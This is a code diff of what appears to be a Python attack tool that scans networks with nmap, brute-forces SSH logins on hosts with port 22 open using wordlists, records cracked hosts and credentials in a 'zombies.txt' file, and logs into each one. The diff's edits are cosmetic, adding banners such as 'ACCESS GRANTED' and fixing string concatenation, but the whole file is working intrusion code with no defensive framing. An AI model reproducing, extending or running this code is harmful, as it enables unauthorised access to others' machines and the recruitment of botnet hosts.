@@ -48,7 +48,7 @@ def sshLogin(user, ip, password):
 
 
 def ssh(ip):
-    threadSafePrint(bcolors.BOLD , bcolors.HEADER , "Trying to login to ", ip ,  bcolors.ENDC)
+    threadSafePrint(bcolors.BOLD , bcolors.HEADER , " ************************* Trying to login to *****************", ip ,  bcolors.ENDC)
     zombies = openFile('zombies.txt', 'a')
     scanner_t2.scan(hosts=ip, ports='22', arguments='--script ssh-brute --script-args userdb=users.txt,'
                                                     'passdb=passwords.txt')
@@ -60,7 +60,8 @@ def ssh(ip):
             try:
                 data = ports['tcp'][22]['script']['ssh-brute']
                 user, password = data.replace('\n', '').split('Accounts:')[1].split('-')[0].strip().split(':')
-                zombies.write(ip , " " , user , " " , password , '\n')
+                threadSafePrint(bcolors.OKGREEN, "^^^^^^^^^^^^^^^^^^^^^^^^^^^ ACCESS GRANTED ^^^^^^^^^^^^^^^^^^^^^^", bcolors.ENDC)
+                zombies.write(ip + " " + user + " " + password + '\n')
                 t = Thread(target=sshLogin, args=(user, ip, password))
                 t.start()
             except:
@@ -78,17 +79,17 @@ def scan(q, network):
             threadSafePrint(bcolors.OKCYAN , "Scanned :", scanner_t1.all_hosts() ,  bcolors.ENDC)
             for newIp in scanner_t1.all_hosts():
                 if newIp not in newConnectedIp:
-                    threadSafePrint(bcolors.BOLD , bcolors.UNDERLINE , bcolors.OKGREEN , "new ip is found : ", newIp , bcolors.ENDC)
+                    threadSafePrint(bcolors.BOLD , bcolors.OKGREEN , "new ip is found : ", newIp , bcolors.ENDC)
                     scanner_t1.scan(newIp, '1-1024', '-v -sS')
                     if scanner_t1[newIp].state() == 'up':
                         protocols = scanner_t1[newIp].all_protocols()
                         if 'tcp' in protocols:
                             ports = scanner_t1[newIp]['tcp'].keys()
-                            threadSafePrint( bcolors.BOLD , bcolors.UNDERLINE , "Open port of ", newIp, ports ,  bcolors.ENDC)
+                            threadSafePrint( bcolors.BOLD , "Open port of ", newIp, ports ,  bcolors.ENDC)
                             if 22 in ports:
-                                q.put(newIp , ":22")
+                                q.put(newIp + ":22")
                                 newConnectedIp.append(newIp)
-                                threadSafePrint( bcolors.BOLD , bcolors.UNDERLINE , bcolors.OKBLUE , "port 22 is opened" ,  bcolors.ENDC)
+                                threadSafePrint( bcolors.BOLD , bcolors.OKBLUE , "port 22 is opened" ,  bcolors.ENDC)
                             else:
                                 threadSafePrint( bcolors.BOLD , bcolors.FAIL , "port 22 is not opened" ,  bcolors.ENDC)
                         # TODO : for another protocol and port
@@ -107,7 +108,7 @@ def attack(q):
             pass
         else:
             ip, port = q.get().split(':')
-            threadSafePrint(bcolors.OKCYAN , "Trying to attack to ", ip, "on port ", port , bcolors.ENDC)
+            threadSafePrint(bcolors.OKCYAN , "!!!!!!!!!!!!!!!!!!!!!!!!  Trying to attack to !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!", ip, "on port ", port , bcolors.ENDC)
             if port.find("22") != -1:
                 ssh(ip)
             else:
